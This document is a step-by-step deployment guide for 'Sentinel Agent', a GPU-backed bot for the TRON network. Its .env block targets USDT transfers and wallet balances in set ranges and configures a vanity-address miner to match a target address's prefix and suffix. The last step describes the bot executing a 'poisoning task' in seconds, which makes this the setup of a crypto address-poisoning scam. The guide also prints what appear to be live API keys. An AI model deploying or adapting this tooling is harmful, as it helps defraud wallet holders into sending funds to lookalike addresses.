# Sentinel Agent - Vast.ai Centralized Deployment Guide (Zero to Hero)

This guide describes how to deploy the entire Sentinel Agent system natively inside a completely fresh Vast.ai instance with **2x RTX 4090 GPUs**. No prior setup on the instance is required.

---

## Step 1: Launch the Instance on Vast.ai
1. Go to your **Vast.ai Console** (Client Zone).
2. Look at the template list and select an image that has **NVIDIA PyTorch** or **Cuda Base** (e.g., `nvidia/cuda:12.0.1-devel-ubuntu22.04` or similar PyTorch images).
3. Choose a machine featuring **2x RTX 4090 GPUs**.
4. Before clicking RENT, look at the **Edit Image & Ports** or **Host Port Button**:
   - Make sure you publish/open port **8000** (this is where our Web Dashboard runs).
5. Press **RENT** and wait for the SSH button to appear. Copy the SSH command.

---

## Step 2: Login via SSH and Run Global Setup
Open your terminal (or Putty) on your PC, paste the SSH command to log into the fresh machine, and run these commands to install EVERYTHING required from scratch:

```bash
# 1. Update the fresh Linux package list
apt-get update && apt-get upgrade -y

# 2. Install Git, Python Virtual Environment, Redis Database, and Screen utility
apt-get install -y python3-pip python3-venv curl git redis-server screen

# 3. Verify that your 2x RTX 4090 GPUs are perfectly healthy and visible
nvidia-smi
```

---

## Step 3: Clone Code and Build the Workspace
Now, download your project repository into the fast `/workspace` directory:

```bash
# Move to workspace folder
cd /workspace

# Clone the latest codebase
git clone https://github.com/khandev1211-cpu/Tron.git /workspace/Tron
cd /workspace/Tron

# Run the automated deployment script to configure the python virtual environment
bash scripts/vast_setup.sh
```

---

## Step 4: Configure the Built-in Redis Database
Since this is a fresh machine, let's start the background database instance right now:

```bash
# Start Redis database securely in the background
redis-server --daemonize yes

# Test if database is alive
redis-cli ping
# (It should reply with "PONG")
```

---

## Step 5: Setup Environment variables (.env)
We need to create the `.env` settings file to hold our credentials and target matching parameters:

```bash
nano /workspace/Tron/.env
```
Paste this exact block into the screen:
```env
# --- API CONFIG CORRIDORS ---
TRON_GRID_API_KEY=1a3b90ac-7f2c-4100-83ef-22f8e8585323
TRONSCAN_API_KEY=09e6c62e-dc11-4e6a-88b0-64c70e8d640b

# --- CENTRALIZED STATE LAYER ---
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_TTL=86400

# --- BOT PRODUCTION BALANCES ---
BOT_FILTER_MIN_TRANSFER=200
BOT_FILTER_MAX_TRANSFER=300
BOT_FILTER_MIN_BALANCE=9800
BOT_FILTER_MAX_BALANCE=18500
USDT_CONTRACT=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t

# --- MULTI-GPU ACTION CONFIG ---
# Path to the provanity executable in your workspace folder
GPU_MINER_PATH=/workspace/provanity

# Precision level: 3+3 (6 chars total) is optimized for 2-15s matching on 2x 4090
GPU_PREFIX_MATCH_LEN=3
GPU_SUFFIX_MATCH_LEN=3
GPU_MINING_TIMEOUT=15
```
*To Save:* Press `Ctrl+O` then `Enter`.  
*To Exit:* Press `Ctrl+X`.

---

## Step 6: Start the Entire System (24/7 Mode)
We will launch the Master Agent Orchestration Hub inside a background session (`screen`) so it continues working even when you shut down your PC or close the SSH window:

```bash
# Open a persistent background console slot
screen -S sentinel

# Activate virtual environment
source venv/bin/activate

# Launch the Master Agent Hub
python3 agent_system.py
```
- **To Leave it running in the background**: Press `Ctrl+A` then press `D`. (You can now close your terminal safely!)
- **To Come back and check the logs later**: Type `screen -r sentinel`.

---

## Step 7: Open Your Web Dashboard Control Panel
1. Go back to your browser window on the Vast.ai website.
2. In your instances list, look at your running container row.
3. Click on the **PROXY** button or look at the dynamic link generated for port **8000**.
4. Boom! Your Sentinel Dashboard will open up live. You can now tap **"Vanity It!"** on any target match, and the 2x RTX 4090s will execute the poisoning task in 2-15 seconds!
